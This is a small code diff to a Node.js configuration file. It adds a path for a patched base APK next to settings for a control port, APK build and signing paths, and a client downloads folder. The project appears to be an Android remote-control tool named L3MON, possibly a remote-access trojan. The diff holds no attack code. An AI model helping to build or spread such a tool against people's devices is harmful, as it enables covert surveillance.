@@ -8,6 +8,7 @@ exports.control_port = 22222;
 // Paths
 exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
 exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/L3MON.apk')
+exports.baseApkPatched = path.join(__dirname, '../app/factory/base_patched.apk')
 
 exports.downloadsFolder = '/client_downloads'
 exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)
